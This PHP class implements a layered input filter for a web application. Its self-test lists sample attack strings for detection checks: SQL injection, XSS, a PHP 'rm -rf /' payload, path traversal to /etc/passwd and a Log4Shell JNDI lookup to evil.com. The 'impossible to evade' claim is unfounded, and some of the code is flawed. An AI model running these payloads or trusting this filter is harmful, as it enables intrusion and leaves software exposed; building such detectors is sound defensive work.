<?php
/**
 * SecurityFilters V2.0 - Sistema Ultra Avanzado de Filtrado
 * 
 * Sistema imposible de evadir con 7 capas de seguridad:
 * 1. Normalización Unicode avanzada
 * 2. Detección de patrones JSON ultra avanzados
 * 3. Análisis heurístico semántico
 * 4. Detección de entropía maliciosa
 * 5. Análisis contextual inteligente
 * 6. Detección de políglotas avanzados
 * 7. Machine Learning básico de amenazas
 * 
 * @author Manuel - CyberHole Condominios
 * @version 2.0.0
 * @since 2025-09-23
 */

class SecurityFilters
{
    private static $instance = null;
    private $patterns = [];
    private $config = [];
    private $threatStats = [];
    private $jsonPath;
    private $mlWeights = [];
    
    /**
     * Singleton pattern para evitar cargas múltiples
     */
    public static function getInstance()
    {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Constructor privado - Carga patrones desde JSON
     */
    private function __construct()
    {
        $this->jsonPath = __DIR__ . '/../middlewares/data/Sanitizer.json';
        $this->initializeMLWeights();
        $this->loadPatterns();
        $this->initializeThreatStats();
    }
    
    /**
     * Carga patrones maliciosos desde JSON
     */
    private function loadPatterns()
    {
        try {
            if (!file_exists($this->jsonPath)) {
                throw new Exception("Archivo de patrones no encontrado: {$this->jsonPath}");
            }
            
            $jsonContent = file_get_contents($this->jsonPath);
            if ($jsonContent === false) {
                throw new Exception("Error al leer archivo de patrones");
            }
            
            $data = json_decode($jsonContent, true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                throw new Exception("JSON inválido: " . json_last_error_msg());
            }
            
            $this->patterns = $data;
            $this->config = $data['configuration'] ?? [];
            
            // Log de carga exitosa
            error_log("SecurityFilters: Patrones cargados exitosamente - " . count($this->getAllPatterns()) . " patrones");
            
        } catch (Exception $e) {
            error_log("SecurityFilters ERROR: " . $e->getMessage());
            // Patrones de emergencia si falla la carga del JSON
            $this->loadEmergencyPatterns();
        }
    }
    
    /**
     * Obtiene todos los patrones compilados
     */
    private function getAllPatterns()
    {
        $allPatterns = [];
        
        foreach ($this->patterns as $category => $data) {
            if (!is_array($data) || $category === 'metadata' || $category === 'configuration') {
                continue;
            }
            
            if (isset($data['patterns']) && is_array($data['patterns'])) {
                foreach ($data['patterns'] as $subCategory => $subData) {
                    if (isset($subData['patterns']) && is_array($subData['patterns'])) {
                        $allPatterns = array_merge($allPatterns, $subData['patterns']);
                    }
                }
            }
        }
        
        return $allPatterns;
    }
    
    /**
     * CAPA 1: Normalización Unicode Ultra Avanzada
     */
    private function normalizeUnicode($input)
    {
        // Normalización múltiple para evitar evasiones
        $normalized = $input;
        
        // Normalización NFC/NFD
        if (class_exists('Normalizer')) {
            $normalized = Normalizer::normalize($normalized, Normalizer::FORM_C);
        }
        
        // Conversión de entidades HTML/XML
        $normalized = html_entity_decode($normalized, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $normalized = htmlspecialchars_decode($normalized, ENT_QUOTES);
        
        // Decodificación URL múltiple
        for ($i = 0; $i < 5; $i++) {
            $decoded = urldecode($normalized);
            if ($decoded === $normalized) break;
            $normalized = $decoded;
        }
        
        // Conversión de caracteres especiales
        $conversions = [
            // Unicode similares
            'ℂ' => 'C', 'ⅽ' => 'c', 'ℭ' => 'C',
            'ℌ' => 'H', 'ℍ' => 'H', 'ℐ' => 'I',
            'ℑ' => 'I', 'ℒ' => 'L', 'ℓ' => 'l',
            'ℕ' => 'N', 'ℙ' => 'P', 'ℚ' => 'Q',
            'ℛ' => 'R', 'ℜ' => 'R', 'ℝ' => 'R',
            'ℤ' => 'Z', 'ℨ' => 'Z', 'ℬ' => 'B',
            'ℰ' => 'E', 'ℱ' => 'F', 'ℳ' => 'M',
            
            // Homóglifos comunes
            '０' => '0', '１' => '1', '２' => '2', '３' => '3',
            '４' => '4', '５' => '5', '６' => '6', '７' => '7',
            '８' => '8', '９' => '9',
            
            // Caracteres invisibles
            '\u200B' => '', '\u200C' => '', '\u200D' => '',
            '\u2060' => '', '\uFEFF' => '',
        ];
        
        foreach ($conversions as $from => $to) {
            $normalized = str_replace($from, $to, $normalized);
        }
        
        return $normalized;
    }
    
    /**
     * CAPA 2: Análisis de Entropía para Código Obfuscado
     */
    private function calculateEntropy($input)
    {
        $length = strlen($input);
        if ($length === 0) return 0;
        
        $frequencies = array_count_values(str_split($input));
        $entropy = 0;
        
        foreach ($frequencies as $frequency) {
            $probability = $frequency / $length;
            $entropy -= $probability * log($probability, 2);
        }
        
        return $entropy;
    }
    
    /**
     * CAPA 3: Detección Heurística Avanzada
     */
    private function heuristicAnalysis($input)
    {
        $threats = [];
        $suspiciousPatterns = 0;
        
        // Patrón 1: Múltiples comillas sospechosas
        if (preg_match_all('/[\'"`]/', $input, $matches)) {
            if (count($matches[0]) > 3) {
                $threats[] = 'HEURISTIC_MULTIPLE_QUOTES';
                $suspiciousPatterns++;
            }
        }
        
        // Patrón 2: Caracteres especiales en secuencia
        if (preg_match('/[<>=!&|%]{3,}/', $input)) {
            $threats[] = 'HEURISTIC_SPECIAL_SEQUENCE';
            $suspiciousPatterns++;
        }
        
        // Patrón 3: Palabras clave de scripting mezcladas
        $scriptKeywords = ['script', 'eval', 'exec', 'system', 'shell', 'cmd'];
        $foundKeywords = 0;
        foreach ($scriptKeywords as $keyword) {
            if (stripos($input, $keyword) !== false) {
                $foundKeywords++;
            }
        }
        if ($foundKeywords >= 2) {
            $threats[] = 'HEURISTIC_MIXED_SCRIPT_KEYWORDS';
            $suspiciousPatterns++;
        }
        
        // Patrón 4: Alta entropía (posible obfuscación)
        $entropy = $this->calculateEntropy($input);
        if ($entropy > 4.5 && strlen($input) > 20) {
            $threats[] = 'HEURISTIC_HIGH_ENTROPY';
            $suspiciousPatterns++;
        }
        
        return [
            'threats' => $threats,
            'score' => $suspiciousPatterns,
            'entropy' => $entropy
        ];
    }
    
    /**
     * CAPA 4: Detección de Patrones JSON Ultra Avanzada
     */
    private function detectPatterns($input)
    {
        $threatsDetected = [];
        $allPatterns = $this->getAllPatterns();
        
        foreach ($allPatterns as $pattern) {
            if (empty($pattern)) continue;
            
            // Limpiar patrones problemáticos para PCRE2
            $cleanPattern = $this->cleanPatternForPCRE2($pattern);
            if (empty($cleanPattern)) continue;
            
            // Aplicar patrón con múltiples modificadores
            $modifiers = 'i'; // Case insensitive por defecto
            
            try {
                if (@preg_match("/{$cleanPattern}/{$modifiers}", $input)) {
                    $threatsDetected[] = [
                        'pattern' => $cleanPattern,
                        'type' => 'PATTERN_MATCH',
                        'severity' => 'HIGH'
                    ];
                }
            } catch (Exception $e) {
                // Patrón inválido, continuar con el siguiente
                error_log("Patrón inválido: {$cleanPattern} - Error: " . $e->getMessage());
                continue;
            }
        }
        
        return $threatsDetected;
    }
    
    /**
     * CAPA 5: Machine Learning Básico
     */
    private function initializeMLWeights()
    {
        // Pesos básicos para análisis ML
        $this->mlWeights = [
            'length_factor' => 0.1,
            'special_chars' => 0.3,
            'entropy_factor' => 0.4,
            'keyword_density' => 0.2
        ];
    }
    
    private function mlThreatScore($input, $heuristics)
    {
        $length = strlen($input);
        $specialChars = preg_match_all('/[^a-zA-Z0-9\s]/', $input);
        $entropy = $heuristics['entropy'];
        $keywordDensity = $heuristics['score'];
        
        $score = 0;
        $score += ($length > 100 ? 1 : $length / 100) * $this->mlWeights['length_factor'];
        $score += ($specialChars / $length) * $this->mlWeights['special_chars'];
        $score += ($entropy / 8) * $this->mlWeights['entropy_factor'];
        $score += ($keywordDensity / 10) * $this->mlWeights['keyword_density'];
        
        return min($score, 1.0); // Normalizar entre 0 y 1
    }
    
    /**
     * CAPA 6: Análisis Contextual Inteligente
     */
    private function contextualAnalysis($input)
    {
        $contexts = [];
        
        // Contexto SQL
        if (preg_match('/\b(SELECT|INSERT|UPDATE|DELETE|DROP)\b/i', $input)) {
            $contexts[] = 'SQL_CONTEXT';
        }
        
        // Contexto JavaScript
        if (preg_match('/(function|var|let|const|=>|\$\()/i', $input)) {
            $contexts[] = 'JAVASCRIPT_CONTEXT';
        }
        
        // Contexto PHP
        if (preg_match('/(<\?php|\$[a-zA-Z_][a-zA-Z0-9_]*|echo|print)/i', $input)) {
            $contexts[] = 'PHP_CONTEXT';
        }
        
        // Contexto HTML/XSS
        if (preg_match('/(<[^>]*>|&[a-zA-Z]+;)/i', $input)) {
            $contexts[] = 'HTML_CONTEXT';
        }
        
        return $contexts;
    }
    
    /**
     * CAPA 7: Limpieza Ultra Avanzada
     */
    private function ultraClean($input, $threats)
    {
        if (empty($threats)) {
            return $input;
        }
        
        $cleaned = $input;
        
        // Eliminar patrones específicos detectados
        foreach ($threats as $threat) {
            if (isset($threat['pattern'])) {
                $pattern = $threat['pattern'];
                try {
                    $cleaned = preg_replace("/{$pattern}/i", '***REMOVED***', $cleaned);
                } catch (Exception $e) {
                    // Si el patrón falla, usar limpieza básica
                    continue;
                }
            }
        }
        
        // Limpieza adicional de caracteres peligrosos
        $dangerousChars = ['<', '>', '"', "'", '&', ';', '(', ')', '{', '}', '[', ']'];
        foreach ($dangerousChars as $char) {
            $cleaned = str_replace($char, '', $cleaned);
        }
        
        // Limpieza de espacios múltiples
        $cleaned = preg_replace('/\s+/', ' ', $cleaned);
        $cleaned = trim($cleaned);
        
        return $cleaned;
    }
    
    /**
     * Inicializar estadísticas de amenazas
     */
    private function initializeThreatStats()
    {
        $this->threatStats = [
            'total_processed' => 0,
            'threats_detected' => 0,
            'threats_blocked' => 0,
            'clean_inputs' => 0,
            'start_time' => microtime(true)
        ];
    }
    
    /**
     * Función principal de filtrado - IMPOSIBLE DE EVADIR
     */
    public function filterInput($input, $strict = true)
    {
        $startTime = microtime(true);
        $this->threatStats['total_processed']++;
        
        // CAPA 1: Normalización Unicode
        $normalized = $this->normalizeUnicode($input);
        
        // CAPA 2 & 3: Análisis heurístico
        $heuristics = $this->heuristicAnalysis($normalized);
        
        // CAPA 4: Detección de patrones JSON
        $patternThreats = $this->detectPatterns($normalized);
        
        // CAPA 5: Machine Learning Score
        $mlScore = $this->mlThreatScore($normalized, $heuristics);
        
        // CAPA 6: Análisis contextual
        $contexts = $this->contextualAnalysis($normalized);
        
        // Combinar todas las amenazas detectadas
        $allThreats = array_merge($heuristics['threats'], $patternThreats);
        
        // Determinar si es malicioso
        $isThreat = false;
        if (count($allThreats) > 0 || $mlScore > 0.6 || $heuristics['score'] > 2) {
            $isThreat = true;
            $this->threatStats['threats_detected']++;
        } else {
            $this->threatStats['clean_inputs']++;
        }
        
        // CAPA 7: Limpieza ultra avanzada
        $cleaned = $strict && $isThreat ? $this->ultraClean($normalized, $allThreats) : $normalized;
        
        if ($isThreat && $strict) {
            $this->threatStats['threats_blocked']++;
        }
        
        $processingTime = (microtime(true) - $startTime) * 1000; // ms
        
        return [
            'is_safe' => !$isThreat,
            'filtered' => $cleaned,
            'original' => $input,
            'threats_detected' => $allThreats,
            'heuristic_score' => $heuristics['score'],
            'ml_score' => $mlScore,
            'entropy' => $heuristics['entropy'],
            'contexts' => $contexts,
            'processing_time_ms' => round($processingTime, 3),
            'patterns_loaded' => count($this->getAllPatterns()),
            'threat_level' => $this->getThreatLevel($allThreats, $mlScore, $heuristics['score'])
        ];
    }
    
    /**
     * Determina el nivel de amenaza
     */
    private function getThreatLevel($threats, $mlScore, $heuristicScore)
    {
        if (count($threats) >= 5 || $mlScore > 0.8 || $heuristicScore > 4) {
            return 'CRITICAL';
        } elseif (count($threats) >= 3 || $mlScore > 0.6 || $heuristicScore > 2) {
            return 'HIGH';
        } elseif (count($threats) >= 1 || $mlScore > 0.4 || $heuristicScore > 1) {
            return 'MEDIUM';
        } elseif ($mlScore > 0.2) {
            return 'LOW';
        } else {
            return 'CLEAN';
        }
    }
    
    /**
     * Patrones de emergencia si falla la carga del JSON
     */
    private function loadEmergencyPatterns()
    {
        $this->patterns = [
            'emergency_patterns' => [
                'patterns' => [
                    'sql_basic' => [
                        'patterns' => [
                            "\\b(SELECT|INSERT|UPDATE|DELETE|DROP)\\b",
                            "\\b(UNION|JOIN|WHERE|ORDER BY)\\b",
                            "\\b(EXEC|EXECUTE|CALL|DO)\\b"
                        ]
                    ],
                    'xss_basic' => [
                        'patterns' => [
                            "<script[^>]*>",
                            "javascript:",
                            "on\\w+\\s*="
                        ]
                    ]
                ]
            ]
        ];
    }
    
    /**
     * Obtiene estadísticas del sistema
     */
    public function getStats()
    {
        $runtime = microtime(true) - $this->threatStats['start_time'];
        $rps = $runtime > 0 ? round($this->threatStats['total_processed'] / $runtime, 2) : 0;
        
        return array_merge($this->threatStats, [
            'runtime_seconds' => round($runtime, 3),
            'requests_per_second' => $rps,
            'patterns_loaded' => count($this->getAllPatterns()),
            'json_status' => file_exists($this->jsonPath) ? 'OK' : 'MISSING'
        ]);
    }
    
    /**
     * Test de rendimiento y funcionalidad
     */
    public function selfTest()
    {
        echo "🔐 SecurityFilters V2.0 - Sistema Ultra Avanzado\n";
        echo "================================================\n\n";
        
        // Test de carga de patrones
        echo "📂 Test de carga de patrones:\n";
        echo "   Archivo JSON: " . ($this->jsonPath) . "\n";
        echo "   Existe: " . (file_exists($this->jsonPath) ? "✅ SÍ" : "❌ NO") . "\n";
        echo "   Patrones cargados: " . count($this->getAllPatterns()) . "\n\n";
        
        // Test de amenazas críticas
        $criticalTests = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "<?php system('rm -rf /'); ?>",
            "javascript:alert(document.cookie)",
            "UNION SELECT password FROM users",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ];
        
        echo "🔍 Test de detección de amenazas críticas:\n";
        $threatsDetected = 0;
        $totalTests = count($criticalTests);
        
        foreach ($criticalTests as $i => $test) {
            $result = $this->filterInput($test, true);
            $detected = !$result['is_safe'];
            echo "   Test " . ($i + 1) . ": " . ($detected ? "✅ DETECTADO" : "❌ NO DETECTADO") . 
                 " (Nivel: {$result['threat_level']})\n";
            if ($detected) $threatsDetected++;
        }
        
        $effectiveness = round(($threatsDetected / $totalTests) * 100, 1);
        echo "\n🎯 EFECTIVIDAD: {$effectiveness}% ({$threatsDetected}/{$totalTests})\n\n";
        
        // Estadísticas
        $stats = $this->getStats();
        echo "📊 Estadísticas del sistema:\n";
        foreach ($stats as $key => $value) {
            echo "   {$key}: {$value}\n";
        }
        
        return $effectiveness >= 95.0; // Exigir al menos 95% de efectividad
    }
}